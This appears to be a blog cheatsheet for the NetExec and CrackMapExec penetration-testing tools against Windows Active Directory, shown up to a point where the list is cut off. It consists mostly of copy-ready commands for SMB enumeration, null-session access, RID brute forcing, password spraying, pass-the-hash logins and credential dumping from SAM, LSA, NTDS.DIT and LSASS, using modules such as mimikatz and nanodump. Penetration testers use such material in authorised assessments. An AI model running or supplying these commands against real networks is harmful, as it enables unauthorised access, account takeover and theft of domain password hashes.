---
layout: post
title:  NetExec and CrackMapExec Cheatsheet
description: Cheatsheet for NetExec & CrackMapExec in Active Directory environments
date:   2024-10-31 01:00:00 +0300
image:  '/images/20.jpg'
tags:   [Cheatsheets, Tools, Active-Directory]
---
# Getting NetExec and CrackMapExec
```shell
sudo apt install netexec
```
CrackMapExec is by default installed in Kali Linux. However, we can use the following command of an installation is needed:
```shell
sudo apt install crackmapexec
```

Note: Sometimes it's worth using both tools to discard false negatives and false positives.

# NetExec Commands
## Enumeration
```shell
# Enumerating Network (Find active reachable hosts)
nxc smb

# Null Session (Access without Credentials)
nxc smb 172.16.150.20 -u '' -p ''

# Shares
nxc smb 172.16.150.20 -u john -p 'Password123!' --shares

# Shares with Spider Plus
nxc smb 172.16.150.20 -u john -p 'Password123!' -M spider_plus

# Shares with Spider Plus with Dump on Kali (Avoid running it with /24 IP range)
nxc smb 172.16.150.20 -u john -p 'Password123!' -M spider_plus -o READ_ONLY=False

# Domain Password Policy
nxc smb 172.16.150.20 -u john -p 'Password123!' --pass-pol

# Domain Users
nxc smb 172.16.150.20 -u john -p 'Password123!' --users

# Logged Users
nxc smb 172.16.150.20 -u john -p 'Password123!' --loggedon-users

# RID
nxc smb 172.16.150.20 -u john -p 'Password123!' --rid-brute

# Groups
nxc smb 172.16.150.20 -u john -p 'Password123!' --groups

# Local Groups
nxc smb 172.16.150.20 -u john -p 'Password123!' --local-groups

# Sessions
nxc smb 172.16.150.20 -u john -p 'Password123!' --sessions

# Disk
nxc smb 172.16.150.20 -u john -p 'Password123!' --disks
```

## Checking Credentials & Password Spraying
Important Note: Always check Domain Password Policy before Password Spraying to prevent Account Lockouts.
```shell
# Check Credentials - with Password
nxc smb 172.16.150.20 -u john -p 'Password123!'

# Check Credentials - with Hash
nxc smb 172.16.150.20 -u john -H 'NT_HASH'
nxc smb 172.16.150.20 -u john -H 'LM_HASH:NT_HASH'

# Password Spraying
nxc smb 172.16.150.20 -u john jane marcus -p 'Password123!'
nxc smb 172.16.150.20 -u john -p 'Password123!' 'PleaseDontHackMe' '1337H4x0r'
nxc smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt
nxc smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --continue-on-success

# Local Authentication
nxc smb 172.16.150.20 -u john -p 'Password123!' --local-auth
nxc smb 172.16.150.20 -u domain_users.txt -p passwords_found.txt --local-auth
```

## Dumping Credentials
```shell
# SAM
nxc smb 172.16.150.20 -u john -p 'Password123!' --sam

# LSA
nxc smb 172.16.150.20 -u john -p 'Password123!' --lsa

# NTDS.DIT RPC
nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds

# NTDS.DIT VSS
nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds vss

# LSASS
nxc smb 172.16.150.20 -u john -p 'Password123!' -M lsassy
nxc smb 172.16.150.20 -u john -p 'Password123!' -M mimikatz
nxc smb 172.16.150.20 -u john -p 'Password123!' -M nanodump
nxc smb 172.16.150.20 -u john -p 'Password123!' -M procdump